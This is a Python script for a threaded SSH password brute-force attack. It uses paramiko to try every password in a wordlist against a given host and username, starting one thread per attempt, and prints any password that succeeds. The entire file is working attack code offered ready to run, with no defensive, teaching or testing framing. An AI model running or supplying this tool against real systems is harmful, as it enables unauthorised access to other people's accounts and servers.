import paramiko, sys, os, termcolor, threading, time
import argparse as arg

stop_flag = 0

def get_arguments():
    """Get arguments from the command line"""
    parser = arg.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target', help='The target Address to connect')
    parser.add_argument('-u', '--username', dest='username', help='The SSH Username to connect')
    parser.add_argument('-f', '--file', dest='file', help='Path to File containing Passwords [default: passwords.txt]', default='passwords.txt')
    options = parser.parse_args()
    if not options.target or not options.username:
        options = None
    return options

def ssh_connect(pwd, target, user):
    """Connect to the SSH Server Target"""
    # Declaring we will use a global variable
    global stop_flag
    # Inizialize the connection
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # Try to connect to the SSH Server
    try:
        ssh.connect(target, port=22, username=user, password=pwd)
        stop_flag = 1
        print(termcolor.colored((f'[+] Password Found: {pwd}, for Account: {user}'), 'green'))
    except:
        print(f'[-] Login Incorrect: {pwd}')
    ssh.close()

def check_path(path):
    """Check if the given path to a File exists"""
    if os.path.exists(path) == False:
        print("[!!] That File/Path doesn't exist")
        sys.exit(1)

def search_pwd(file, target, user):
    global stop_flag
    with open(file, 'r', errors='ignore') as f:
        for line in f.readlines():
            password = line.strip()
            t = threading.Thread(target=ssh_connect, args=(password, target, user))
            t.start()
            if stop_flag == 1:
                t.join()
                exit()
            time.sleep(0.5)


if __name__ == '__main__':
    optionsValues = get_arguments()
    if optionsValues:
        check_path(optionsValues.file)
        print(f'\n[*] Starting Threaded SSH Bruteforce on {optionsValues.target}, with account: {optionsValues.username}...')
        search_pwd(optionsValues.file, optionsValues.target, optionsValues.username)
    else:
        host = input('[>] Target Address: ')
        username = input('[>] SSH Username: ')
        pwd_file = input('[>] Passwords File: ')
        check_path(pwd_file)
        print(f'\n[*] Starting Threaded SSH Bruteforce on {host}, with account: {username}...')
        search_pwd(pwd_file, host, username)
